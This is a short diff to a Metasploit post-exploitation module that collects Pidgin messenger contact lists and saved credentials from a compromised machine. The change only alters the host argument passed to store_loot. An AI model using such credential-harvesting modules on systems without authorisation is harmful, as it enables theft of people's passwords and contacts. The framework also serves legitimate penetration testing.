@@ -219,10 +219,10 @@ class Metasploit3 < Msf::Post
 		end
 
 		if datastore['CONTACTS']
-			store_loot("pidgin.contacts", "text/plain", session.tunnel_peer, buddylists.to_s, "pidgin_contactlists.txt", "Pidgin Contacts")
+			store_loot("pidgin.contacts", "text/plain", session, buddylists.to_s, "pidgin_contactlists.txt", "Pidgin Contacts")
 		end
 
-		store_loot("pidgin.creds", "text/plain", session.tunnel_peer, credentials.to_s, "pidgin_credentials.txt", "Pidgin Credentials")
+		store_loot("pidgin.creds", "text/plain", session, credentials.to_s, "pidgin_credentials.txt", "Pidgin Credentials")
 	end
 
 	def parse_accounts(data)
